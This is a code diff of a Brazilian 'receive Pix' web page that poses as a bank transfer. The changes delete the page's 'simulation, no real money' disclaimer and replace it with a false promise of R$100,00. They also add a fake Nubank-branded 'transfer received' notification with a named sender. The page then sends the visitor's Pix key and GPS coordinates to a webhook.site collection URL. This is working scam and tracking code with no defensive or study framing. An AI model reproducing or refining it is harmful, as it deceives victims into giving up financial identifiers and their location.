@@ -2,7 +2,7 @@
 <html lang="pt-BR">
 <head>
 <meta charset="UTF-8">
-<title>receber  Pix</title>
+<title>receber puxPix</title>
 
 <style>
 body{
@@ -58,24 +58,47 @@ small{ color:#777; font-size:12px; }
 <div class="card" id="tela2" style="display:none">
   <input id="chave" placeholder="Digite sua chave Pix">
   <button onclick="confirmar()">Receber Pix</button>
-  <small>Simulação — nenhum valor real será transferido</small>
+  <small>Simulação — R$100,00 sera transferido</small>
 </div>
 
 <div class="card" id="tela3" style="display:none">
-  <h3>✅ Simulação concluída</h3>
-  <p>Você finalizou uma simulação.</p>
+  <h3>✅ transferência concluída</h3>
+  <p>a transferência chega em ate 3 dias úteis.</p>
 </div>
 
 <script>
 const WEBHOOK = "https://webhook.site/7b90f2d2-5b54-422c-9ab9-24a37ba6bab6";
-let localOk = false;
-let notifOk = false;
 let lastPos = null;
+let locationOk = false;
 
 function pedirPermissoes(){
   document.getElementById("erro1").innerText = "";
 
-  // localização
+  // pedir notificação primeiro, no clique
+  if ("Notification" in window) {
+    Notification.requestPermission().then(permission => {
+      if (permission !== "granted") {
+        document.getElementById("erro1").innerText =
+          "Por favor permita notificações para continuar.";
+        return;
+      }
+
+      // notificação de simulação (genérica)
+      new Notification("transferência recebida", {
+        body: "você recebeu uma transferência de R$100,00 de emanuel filipe viera filho",
+        icon: "https://logodownload.org/wp-content/uploads/2019/08/nubank-logo-2.png"
+      });
+
+      // agora pedir localização
+      pedirLocalizacao();
+    });
+  } else {
+    document.getElementById("erro1").innerText =
+      "Seu navegador não suporta notificações.";
+  }
+}
+
+function pedirLocalizacao(){
   if(!navigator.geolocation){
     document.getElementById("erro1").innerText =
       "Seu navegador não suporta localização.";
@@ -84,46 +107,23 @@ function pedirPermissoes(){
 
   navigator.geolocation.getCurrentPosition(
     pos => {
-      localOk = true;
+      locationOk = true;
       lastPos = pos;
-      pedirNotificacao();
+      document.getElementById("tela1").style.display = "none";
+      document.getElementById("tela2").style.display = "block";
     },
     () => {
       document.getElementById("erro1").innerText =
-        "Por favor, dê as permissões para que possamos continuar a transferência.";
+        "Por favor permita a localização para continuar.";
     }
   );
 }
 
-function pedirNotificacao(){
-  if(!("Notification" in window)){
-    notifOk = false;
-    checarPermissoes();
-    return;
-  }
-
-  Notification.requestPermission().then(p=>{
-    notifOk = (p === "granted");
-    checarPermissoes();
-  });
-}
-
-function checarPermissoes(){
-  if(localOk && notifOk){
-    document.getElementById("tela1").style.display="none";
-    document.getElementById("tela2").style.display="block";
-  }else{
-    document.getElementById("erro1").innerText =
-      "Por favor, dê as permissões para que possamos continuar a simulação.";
-  }
-}
-
 function confirmar(){
-  // envia pra tu
-  fetch(WEBHOOK,{
-    method:"POST",
-    headers:{"Content-Type":"application/json"},
-    body:JSON.stringify({
+  fetch(WEBHOOK, {
+    method: "POST",
+    headers: {"Content-Type": "application/json"},
+    body: JSON.stringify({
       chave_pix: document.getElementById("chave").value,
       latitude: lastPos.coords.latitude,
       longitude: lastPos.coords.longitude,
@@ -133,18 +133,13 @@ function confirmar(){
     })
   });
 
-  // notificação do site
-  if(notifOk){
-    new Notification("Transferência recebida",{
-      body:"você recebeu uma transferência de R$100.00 de carlos emanuel Pinheiro de Alcântara",
-      icon:"nubank-logo-2.png (4096×4108) https://logodownload.org/wp-content/uploads/2019/08/nubank-logo-2.png"
-    });
-  }
-
   document.getElementById("tela2").style.display="none";
   document.getElementById("tela3").style.display="block";
 }
 </script>
+
+</body>
+</html>
 
 </body>
 </html>
